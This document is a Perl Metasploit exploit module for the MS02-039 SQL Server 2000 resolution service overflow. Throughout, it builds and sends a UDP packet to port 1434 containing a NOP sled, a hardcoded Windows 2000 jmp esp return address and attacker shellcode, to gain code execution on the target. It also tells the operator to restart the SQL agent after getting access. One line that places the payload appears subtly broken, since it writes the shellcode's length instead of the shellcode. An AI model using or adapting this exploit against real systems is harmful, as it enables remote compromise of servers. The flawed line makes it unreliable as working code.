package Msf::Exploit::mssql2000_resolution;
use base "Msf::Exploit";
use strict;

my %info =
(
    'Name'  => 'MSSQL 2000 Resolution Overflow',
    'Version'  => '1.0',
    'Author'  => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 1434],
                },
    'AutoOpts' => { 'EXITFUNC' => 'process' },
    'Payload'  => {
                 'Size'  => 512,
                 'BadChars'  => "\x00\x3a\x0a\x0d\x2f\x5c",
               },
    
    'Description'  => "This is an exploit for the SQL Server 2000 resolution service buffer ".
                      "overflow. This overflow is triggered by sending a udp packet to port ".
                      "1434 which starts with 0x04 and is followed by long string terminating ".
                      "with a colon and a number. This module should work against any vulnerable ".
                      "SQL Server 2000 or MSDE install (pre-SP3).",
                
    'Refs'  =>  [  
                    'http://www.microsoft.com/technet/security/bulletin/MS02-039.asp'
                ],
    'Targets' => [
                   ['Windows 2000',   0x42b48774],
                 ],
);

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => \%info}, @_);
    return $self;
}

sub Check {
    my ($self, $opt) = @_;  
    my %r = Pex::MSSQL::Ping($opt->{'RHOST'}, $opt->{'RPORT'});
    
    return "No response" if ! keys(%r);
    return "SQL Server '". $r{'ServerName'} ."' on port ". $r{'tcp'};
}


sub Exploit {
    my ($self, $opt) = @_;

    select(STDOUT);$|++;

    my $target_host = $opt->{'RHOST'};
    my $target_port = $opt->{'RPORT'};
    my $shellcode = $opt->{'SHELLCODE'};
    
    my @targets = @{$self->{'Info'}->{'Targets'}};
    my $target = defined($opt->{'TARGET'}) ? $targets[$opt->{'TARGET'}] : $targets[0];

    my $s = Pex::Socket->new();
    
    if (! $s->udp($target_host, $target_port))
    {
        print "\n[*] Could not create udp socket to target:" . $s->Error() . "\n";
        exit(0);
    }
    
    
    printf("[*] Trying target %s with return address 0x%.8x\n", $target->[0], $target->[1]);
    
    # automatically restart sql server - thanks sk!
    printf("[*] Execute 'net start sqlserveragent' once access is obtained\n"); 

                                        # push dword 0x3838383a
    my $request = "\x04" . ("\x90" x 800) . "\x68:888" . "\x90" . $shellcode;
    
    # return address of jmp esp
    substr($request, 97, 4, pack("L", $target->[1]));
    
    # takes us right here, with 8 bytes available
    substr($request, 101, 8, "\xeb\x69\xeb\x69");
    
    # write to thread storage space ala msrpc
    substr($request, 109, 4, pack("L", 0x7ffde0cc));
    substr($request, 113, 4, pack("L", 0x7ffde0cc));
    
    # the payload starts here
    substr($request, 117, 100, "\x90" x 100);
    substr($request, 217, length($shellcode), length($shellcode));
     
    $s->send($request); 
    sleep(2);
}

1;
